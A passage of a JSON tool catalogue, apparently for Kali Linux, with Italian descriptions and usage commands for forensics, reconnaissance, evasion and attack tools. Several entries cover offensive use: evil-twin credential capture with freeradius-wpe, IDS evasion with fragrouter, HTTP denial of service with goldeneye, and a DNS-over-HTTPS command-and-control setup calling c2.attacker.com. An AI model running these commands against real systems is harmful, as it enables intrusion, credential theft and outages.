    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Foremost è un tool di file carving forense che recupera file da immagini disco basandosi su header, footer e strutture dati interne. Ignora il filesystem e cerca direttamente pattern di file conosciuti. Recupera file anche quando il filesystem è corrotto o cancellato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Header-Based:</strong> Cerca file tramite signature header.</p><p><strong>Multi-Format:</strong> Supporta jpg, png, gif, pdf, doc, exe, zip e altri.</p><p><strong>Configurable:</strong> Aggiungi signature custom in config file.</p><p><strong>Raw Disk:</strong> Lavora su immagini raw e device.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Carving completo con audit file\nforemost -v -T -i disk.img -o /cases/case001/carved/\n\n# Solo documenti (office, pdf)\nforemost -t doc,docx,xls,xlsx,pdf,ppt -i disk.img -o documents/\n\n# Immagini e video\nforemost -t jpg,png,gif,bmp,tif,avi,mov,mpg,wmv -i disk.img -o media/\n\n# Carving da range specifico (offset)\nforemost -i disk.img -o output/ -q  # quiet mode, solo risultati\n\n# Con config custom per signature aggiuntive\ncp /etc/foremost.conf ./custom.conf\n# Aggiungi signature custom\nforemost -c custom.conf -i disk.img -o output/\n\n# Pipeline: dd range -&gt; foremost\ndd if=disk.img bs=512 skip=1000 count=10000 | foremost -T -o partial_carve/\n\n# Carving da RAM dump per artifacts\nforemost -t all -i memory.dmp -o ram_artifacts/\n\n# Solo eseguibili (malware hunting)\nforemost -t exe,dll,sys -i disk.img -o executables/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, recupera evidenze da dischi. Nel <strong>Data Recovery</strong>, ripristina file da dischi danneggiati. <strong>Incident Response</strong> per recuperare file cancellati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Best Practice:</strong> Sempre su copia forense, mai su originale. Considera anche scalpel e photorec per formati aggiuntivi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "fping",
    "name": "fping",
    "version": "5.1",
    "icon": "../app/icons/fping-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fping/",
    "desc": "Ping parallelo per scansione rapida di host attivi su range di IP multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Fping è uno strumento simile a ping ma ottimizzato per scansionare host multipli in parallelo. Permette di verificare rapidamente quali host sono attivi in un range di IP, inviando ICMP echo request a molti target simultaneamente invece che sequenzialmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Parallel Ping:</strong> Scansiona molti host contemporaneamente.</p><p><strong>Range Support:</strong> Accetta CIDR notation e range.</p><p><strong>File Input:</strong> Legge target da file.</p><p><strong>Statistics:</strong> Calcola statistiche su latenza e packet loss.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Discovery veloce: solo host vivi, output pulito\nfping -a -g 192.168.1.0/24 2&gt;/dev/null | tee alive_hosts.txt\n\n# Scan multipli range con timeout ridotto\nfping -a -r 1 -t 100 -g 10.0.0.0/24 172.16.0.0/24 192.168.0.0/24 2&gt;/dev/null\n\n# Con statistiche dettagliate\nfping -s -c 3 -g 192.168.1.0/24\n\n# Output per nmap (solo IP)\nfping -a -g 192.168.1.0/24 2&gt;/dev/null &gt; targets.txt\nnmap -iL targets.txt -sV\n\n# Genera range da netmask alternativo\nfping -a -g 192.168.1.1 192.168.1.254 2&gt;/dev/null\n\n# Loop monitoring\nfping -l -p 1000 -B 1.5 server1 server2 server3\n\n# Pipeline con masscan per porte\nfping -a -g 10.0.0.0/8 2&gt;/dev/null | \\\n  xargs -I{} masscan {} -p80,443,22 --rate=1000\n\n# Quiet con conteggio risultati\nfping -a -q -g 192.168.0.0/16 2&gt;/dev/null | wc -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Host Discovery</strong>, identifica rapidamente host attivi. Nel <strong>Network Mapping</strong>, primo step di ricognizione. <strong>Monitoring</strong> per verificare disponibilità di server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> ICMP può essere bloccato/loggato. Alcuni host non rispondono a ping ma sono attivi. Usa in combinazione con altre tecniche.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "fragrouter",
    "name": "fragrouter",
    "version": "1.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/fragrouter/",
    "desc": "IDS evasion toolkit che frammenta pacchetti per bypassare sistemi di rilevamento.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Fragrouter è un tool per IDS evasion che intercetta e manipola pacchetti di rete per evadere sistemi di rilevamento intrusioni. Frammenta, riordina e modifica il traffico in modi che confondono gli IDS ma vengono riassemblati correttamente dal target. Toolkit storico per testing IDS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fragmentation:</strong> Frammenta pacchetti in modi evasivi.</p><p><strong>Reordering:</strong> Invia frammenti fuori ordine.</p><p><strong>Overlapping:</strong> Crea frammenti sovrapposti per confondere IDS.</p><p><strong>Multiple Modes:</strong> Diversi metodi di evasione configurabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia con frammentazione base\nfragrouter -B1\n\n# Ordered 8-byte fragments\nfragrouter -F1\n\n# Random fragment order\nfragrouter -F2\n\n# Lista modi disponibili\nfragrouter -h</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IDS Testing</strong>, verifica se l'IDS rileva traffico frammentato. Nel <strong>Red Team</strong>, evade detection durante attacchi. <strong>Research</strong> su tecniche di evasione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Datato:</strong> IDS moderni gestiscono meglio frammentazione. Tool storico, considera alternative più recenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "freeradius-wpe",
    "name": "freeradius-wpe",
    "version": "3.2.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/freeradius-wpe/",
    "desc": "FreeRADIUS patchato per catturare credenziali PEAP/MSCHAPv2 in evil twin attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>FreeRADIUS-WPE (Wireless Pwnage Edition) è FreeRADIUS patchato per attacchi a reti WPA2-Enterprise. Invece di autenticare, logga le credenziali PEAP/MSCHAPv2 ricevute dai client che si connettono al fake AP. Cattura username e challenge/response per cracking offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Logging:</strong> Logga tutte le credenziali ricevute.</p><p><strong>MSCHAPv2 Capture:</strong> Cattura challenge/response per cracking.</p><p><strong>PEAP Support:</strong> Gestisce autenticazione PEAP completa.</p><p><strong>hostapd Integration:</strong> Si integra con hostapd per evil twin.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Configura e avvia\nradiusd -X\n\n# I log delle credenziali in\ntail -f /var/log/freeradius/radius.log\n\n# Usa con hostapd configurato per WPA-Enterprise\n# Combinato con eaphammer per setup automatico</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Pentesting</strong>, cattura credenziali enterprise. Nel <strong>Red Team</strong>, ottiene account domain via WiFi. <strong>Lab Setup</strong> per testing autenticazione RADIUS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Evil twin rilevabile da WIDS. Certificate mismatch può alertare utenti attenti. Usa eaphammer per setup più semplice.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "freeradius",
    "name": "freeradius",
    "version": "3.2.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/freeradius/",
    "desc": "Server RADIUS open source per autenticazione, usato per setup lab e rogue AP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>FreeRADIUS è il server RADIUS open source più diffuso, usato per autenticazione AAA (Authentication, Authorization, Accounting). In ambito pentesting serve per creare lab WPA2-Enterprise, testare configurazioni RADIUS e come base per rogue AP con autenticazione enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full RADIUS:</strong> Implementazione completa del protocollo RADIUS.</p><p><strong>EAP Support:</strong> PEAP, EAP-TLS, EAP-TTLS, MSCHAPv2.</p><p><strong>LDAP/AD Integration:</strong> Autenticazione contro directory.</p><p><strong>Accounting:</strong> Logging completo delle sessioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia in debug mode\nradiusd -X\n\n# Test autenticazione\nradtest user password localhost 0 testing123\n\n# Verifica configurazione\nradiusd -C\n\n# File di configurazione in /etc/freeradius/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Lab Setup</strong>, crea ambiente WPA2-Enterprise per testing. Nel <strong>Blue Team</strong>, configura autenticazione sicura. <strong>Learning</strong> per capire il funzionamento di RADIUS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legit Tool:</strong> Server di produzione usato legittimamente. Per attacchi, usa la versione WPE patchata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "ftester",
    "name": "ftester",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ftester/",
    "desc": "Firewall testing tool per verificare regole di filtraggio e IDS con pacchetti custom.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>FTester (Firewall Tester) è un tool per testare policy di firewall e sistemi IDS. Consiste in due componenti: ftestd (daemon sul lato interno) e ftest (injector sul lato esterno) che comunicano per verificare quali pacchetti passano attraverso il firewall.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Policy Testing:</strong> Verifica regole firewall con pacchetti reali.</p><p><strong>IDS Testing:</strong> Testa detection di pattern malevoli.</p><p><strong>Stateful Testing:</strong> Verifica gestione connessioni stateful.</p><p><strong>Report Generation:</strong> Genera report sui risultati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Sul lato interno, avvia daemon\nftestd -i eth0 -v\n\n# Sul lato esterno, esegui test\nftest -f test.cfg -d eth0 -s 192.168.1.1\n\n# Configura test in test.cfg con regole da verificare\n# Analizza report generato</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Firewall Audit</strong>, verifica che le regole siano corrette. Nel <strong>Compliance</strong>, documenta configurazione firewall. <strong>Change Management</strong> per testare modifiche prima del deploy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Collaborativo:</strong> Richiede accesso su entrambi i lati del firewall. Tool per audit interno, non per attacchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "getallrepos",
    "name": "getallrepos",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/getallrepos/",
    "desc": "Scarica tutti i repository GitHub di un utente o organizzazione per analisi offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GetAllRepos scarica automaticamente tutti i repository Git di un utente o organizzazione GitHub/GitLab. Utile per analisi offline del codice, ricerca di secret, audit di sicurezza e backup. Supporta clonazione parallela per velocità.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bulk Clone:</strong> Scarica tutti i repo di un utente/org.</p><p><strong>GitHub/GitLab:</strong> Supporta entrambe le piattaforme.</p><p><strong>Parallel Download:</strong> Clonazione parallela per velocità.</p><p><strong>Authentication:</strong> Supporta token per repo privati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scarica tutti i repo di un utente\ngetallrepos -u username -o output_dir/\n\n# Di un'organizzazione\ngetallrepos -org orgname -o repos/\n\n# Con token per repo privati\ngetallrepos -u user -t GITHUB_TOKEN -o output/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Code Audit</strong>, analizza tutto il codice di un target. Nel <strong>Bug Bounty</strong>, cerca vulnerabilità in repository pubblici. <strong>Secret Hunting</strong> per trovare credenziali leak.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Public Data:</strong> Scarica solo dati pubblicamente accessibili (senza token). Rate limiting di GitHub può limitare download.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "getsploit",
    "name": "getsploit",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/getsploit/",
    "desc": "Cerca e scarica exploit da database multipli (Exploit-DB, Metasploit, PacketStorm).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Getsploit cerca e scarica exploit da database multipli online: Exploit-DB, Metasploit modules, PacketStorm e altri. Simile a searchsploit ma interroga API online per risultati più aggiornati. Permette download diretto degli exploit trovati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Database:</strong> Cerca in Exploit-DB, Metasploit, PacketStorm.</p><p><strong>Online Search:</strong> Risultati sempre aggiornati via API.</p><p><strong>Direct Download:</strong> Scarica exploit direttamente.</p><p><strong>CVE Search:</strong> Cerca per numero CVE.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca exploit\ngetsploit apache 2.4\n\n# Per CVE\ngetsploit CVE-2021-44228\n\n# Scarica exploit\ngetsploit -d windows smb\n\n# Limita risultati\ngetsploit -l 10 wordpress</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Vulnerability Research</strong>, trova exploit per software specifico. Nel <strong>Pentest</strong>, cerca PoC per CVE trovate. Complementa <strong>searchsploit</strong> con risultati online.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Internet Required:</strong> Richiede connessione internet. Query possono essere loggabili. Usa searchsploit per ricerche offline.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "ghidra",
    "name": "ghidra",
    "version": "11.4.2",
    "icon": "../app/icons/ghidra-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ghidra/",
    "desc": "Framework NSA per reverse engineering: disassembler, decompiler, analisi binaria avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ghidra è un framework di reverse engineering open source sviluppato dalla NSA. Include disassembler, decompiler, analisi di flusso, scripting Python/Java e supporto per decine di architetture. Alternativa gratuita e potente a IDA Pro per analisi binaria professionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompiler:</strong> Decompila binari in pseudo-C leggibile.</p><p><strong>Multi-Architecture:</strong> x86, x64, ARM, MIPS, PowerPC e molti altri.</p><p><strong>Scripting:</strong> Automazione con Python e Java.</p><p><strong>Collaboration:</strong> Supporto per progetti condivisi.</p><p><strong>Extensible:</strong> Plugin e estensioni community.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Ghidra\nghidraRun\n\n# Crea nuovo progetto, importa binario\n# Auto-analisi identifica funzioni e strutture\n# Decompiler window mostra codice C\n\n# Scripting da CLI\nanalyzeHeadless /path/to/project MyProject -import binary</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, analizza sample sospetti. Nel <strong>Vulnerability Research</strong>, trova bug in binari. <strong>CTF</strong> per challenge di reverse engineering. <strong>Exploit Development</strong> per capire target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Analisi Locale:</strong> Tool di analisi offline. Attenzione a non eseguire malware durante analisi. Usa VM isolate.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "gitleaks",
    "name": "gitleaks",
    "version": "8.16.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gitleaks/",
    "desc": "Scansiona repository Git per trovare secrets, API key e credenziali hardcoded nel codice.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Gitleaks è uno scanner SAST (Static Application Security Testing) per trovare secrets hardcoded in repository Git. Rileva API key, password, token, chiavi private e altri dati sensibili nel codice e nella history dei commit. Scritto in Go per performance elevate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Pattern Detection:</strong> Regole per 100+ tipi di secret.</p><p><strong>Git History:</strong> Scansiona tutti i commit, non solo HEAD.</p><p><strong>CI Integration:</strong> Si integra in pipeline CI/CD.</p><p><strong>Baseline:</strong> Ignora secret già noti per ridurre rumore.</p><p><strong>Custom Rules:</strong> Regole configurabili in TOML.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansiona repository locale\ngitleaks detect -s /path/to/repo\n\n# Solo commit recenti\ngitleaks detect -s . --log-opts=\"-n 100\"\n\n# Output JSON\ngitleaks detect -s . -f json -r report.json\n\n# Proteggi prima di commit\ngitleaks protect --staged</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>DevSecOps</strong>, integra in CI/CD per prevenire leak. Nel <strong>Bug Bounty</strong>, trova secret in repo pubblici. <strong>Code Audit</strong> per verificare assenza di credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Defensive:</strong> Tool principalmente difensivo. Aiuta a trovare e rimuovere secret esposti prima che lo facciano gli attaccanti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "gitxray",
    "name": "gitxray",
    "version": "1.0.18",
    "icon": "../app/icons/gitxray-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gitxray/",
    "desc": "Analizza repository GitHub per trovare contributor, SSH key e pattern sospetti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GitXray analizza repository GitHub per estrarre informazioni su contributor, chiavi SSH pubbliche, email, pattern di sviluppo e potenziali indicatori di compromissione. Utile per OSINT su sviluppatori e analisi di supply chain software.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Contributor Analysis:</strong> Profila sviluppatori del repo.</p><p><strong>SSH Key Extraction:</strong> Trova chiavi SSH pubbliche degli utenti.</p><p><strong>Email Discovery:</strong> Estrae email dai commit.</p><p><strong>Pattern Analysis:</strong> Identifica comportamenti sospetti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analizza repository\ngitxray -r https://github.com/org/repo\n\n# Analizza organizzazione\ngitxray -o organization_name\n\n# Output JSON\ngitxray -r https://github.com/user/repo -o report.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, profila sviluppatori di un progetto. Nella <strong>Supply Chain Security</strong>, analizza contributor di dipendenze. <strong>Threat Intel</strong> su attori che usano GitHub.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Public Data:</strong> Usa solo dati pubblici GitHub. Rate limiting dell'API può limitare analisi su larga scala.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "gobuster",
    "name": "gobuster",
    "version": "3.8.0",
    "icon": "../app/icons/gobuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gobuster/",
    "desc": "Brute forcer in Go per directory web, DNS subdomain, vhost e S3 bucket enumeration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Gobuster è un tool di brute forcing scritto in Go per enumerazione di directory web, subdomain DNS, vhost e bucket S3. Estremamente veloce grazie alla concorrenza di Go, è uno dei tool più usati per content discovery. Supporta estensioni, status code filtering e output multipli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dir Mode:</strong> Enumera directory e file web.</p><p><strong>DNS Mode:</strong> Brute force di subdomain.</p><p><strong>VHost Mode:</strong> Enumera virtual host.</p><p><strong>S3 Mode:</strong> Trova bucket S3 pubblici.</p><p><strong>High Speed:</strong> Scritto in Go per performance.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory enum con estensioni, status code e dimensione filtro\ngobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -x php,html,txt,bak,old,zip -b 404,403 -s 200,301,302 --exclude-length 0\n\n# VHost discovery con wildcard filtering\ngobuster vhost -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\\n  --append-domain --exclude-length 301\n\n# Subdomain con resolver custom e rate limit\ngobuster dns -d target.com -w subdomains.txt -r 8.8.8.8 --delay 100ms -t 30\n\n# S3 bucket enumeration\ngobuster s3 -w bucket-names.txt --maxdepth 2\n\n# Fuzzing URL con pattern FUZZ\ngobuster fuzz -u https://target.com/api/v1/FUZZ -w params.txt -b 404\n\n# Pipeline completa: proxy attraverso Burp + output JSON\ngobuster dir -u https://target.com -w wordlist.txt -x php \\\n  --proxy http://127.0.0.1:8080 -o results.json --no-tls-validation -q\n\n# Recursive discovery con profondità\ngobuster dir -u https://target.com -w wordlist.txt -r --depth 3 -t 50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Recon</strong>, trova directory e file nascosti. Nel <strong>Bug Bounty</strong>, enumera subdomain e vhost. <strong>Pentest</strong> per content discovery completa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Genera molte request. Usa -t per controllare thread, --delay per rate limiting.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "godoh",
    "name": "godoh",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/godoh/",
    "desc": "C2 agent DNS-over-HTTPS per comunicazioni nascoste che bypassano filtri DNS tradizionali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GoDOH è un proof-of-concept C2 (Command and Control) che usa DNS-over-HTTPS per comunicazioni. Bypassa filtri DNS tradizionali incapsulando comandi in query DoH verso provider legittimi (Google, Cloudflare). Dimostra come DoH può essere abusato per exfiltration.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>DoH Tunneling:</strong> Usa DNS-over-HTTPS per C2.</p><p><strong>Provider Support:</strong> Google DNS, Cloudflare, altri provider DoH.</p><p><strong>Command Execution:</strong> Esegue comandi sul target.</p><p><strong>Data Exfiltration:</strong> Estrae dati via query DoH.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server side (attacker)\ngodoh -mode server -domain c2.attacker.com\n\n# Client side (target)\ngodoh -mode client -domain c2.attacker.com -provider google\n\n# Richiede dominio controllato con record DNS configurati</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team</strong>, C2 che bypassa filtri DNS. Nella <strong>Research</strong>, dimostra rischi di DoH. <strong>Detection Engineering</strong> per sviluppare contromisure.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> DoH a provider noti (Google, Cloudflare) può essere monitorato. Richiede infrastruttura DNS propria per funzionare.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "goldeneye",
    "name": "goldeneye",
    "version": "1.2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goldeneye/",
    "desc": "HTTP DoS test tool che usa Keep-Alive e pipelining per stress testing di web server.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GoldenEye è un tool per stress testing HTTP che sfrutta Keep-Alive e pipelining per consumare risorse del server. Mantiene molte connessioni aperte inviando request incomplete, esaurendo i worker disponibili. Solo per testing autorizzato su propri sistemi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Keep-Alive Abuse:</strong> Mantiene connessioni aperte a lungo.</p><p><strong>Randomized Headers:</strong> User-agent e header casuali.</p><p><strong>Multi-threaded:</strong> Molte connessioni parallele.</p><p><strong>Configurable:</strong> Workers e socket configurabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SOLO SU SISTEMI AUTORIZZATI!\n# Test base\ngoldeneye http://target.com\n\n# Con parametri\ngoldeneye http://target.com -w 100 -s 500\n\n# Specifica metodo\ngoldeneye http://target.com -m POST</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Stress Testing</strong>, verifica resilienza del proprio web server. Nel <strong>Capacity Planning</strong>, determina limiti dell'infrastruttura. <strong>WAF Testing</strong> per verificare protezioni DoS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>ATTENZIONE:</strong> Usare SOLO su sistemi propri con autorizzazione scritta. DoS attacks sono illegali. Tool per testing, non per attacchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "goofile",
    "name": "goofile",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goofile/",
    "desc": "Cerca file specifici (PDF, DOC, XLS) su un dominio usando Google dorks automatizzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Goofile cerca file di tipo specifico su un dominio usando Google dorks automatizzati. Trova documenti PDF, DOC, XLS, PPT e altri file indicizzati da Google per un sito target. I file trovati possono contenere metadati sensibili, email, username e informazioni interne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Google Dorks:</strong> Automatizza query site: filetype:.</p><p><strong>Multiple Types:</strong> Cerca PDF, DOC, XLS, PPT, etc.</p><p><strong>Domain Specific:</strong> Limita ricerca a un dominio.</p><p><strong>URL List:</strong> Genera lista di URL dei file trovati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca PDF su un dominio\ngoofile -d target.com -f pdf\n\n# Documenti Office\ngoofile -d target.com -f doc\n\n# Spreadsheet\ngoofile -d target.com -f xls</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, trova documenti pubblici del target. Nel <strong>Metadata Extraction</strong>, scarica file per analisi EXIF/metadata. <strong>Reconnaissance</strong> per trovare informazioni leak in documenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> Usa Google, non contatta il target direttamente. Rate limiting di Google può bloccare query frequenti. Combina con FOCA per analisi metadata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "gophish",
    "name": "gophish",
    "version": "0.12.1",
    "icon": "../app/icons/gophish-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gophish/",
    "desc": "Framework open source per campagne di phishing con tracking, template e reporting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GoPhish è un framework open source per simulazioni di phishing e security awareness training. Gestisce campagne complete: creazione email con template, landing page per credential harvesting, tracking di aperture/click e reporting dettagliato. Interfaccia web intuitiva per gestione campagne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Email Templates:</strong> Editor WYSIWYG per email di phishing.</p><p><strong>Landing Pages:</strong> Crea pagine di login convincenti.</p><p><strong>User Groups:</strong> Gestisce liste di target.</p><p><strong>Tracking:</strong> Traccia aperture, click, submit credenziali.</p><p><strong>Reporting:</strong> Dashboard e report esportabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia server\n./gophish\n\n# Accedi alla dashboard\n# https://localhost:3333 (default)\n# admin / gophish (password iniziale)\n\n# Configura: Sending Profile, Template, Landing Page\n# Crea Campaign con gruppo utenti target\n# Monitora risultati in tempo reale</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Security Awareness</strong>, testa e forma dipendenti sul phishing. Nel <strong>Red Team</strong>, campagne di phishing controllate. <strong>Compliance</strong> per dimostrare training anti-phishing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Autorizzazione:</strong> Richiede sempre autorizzazione scritta. Configura SPF/DKIM per deliverability. Non usare per phishing non autorizzato.</p><br><hr>",
    "best_in": true,
    "category_path": [
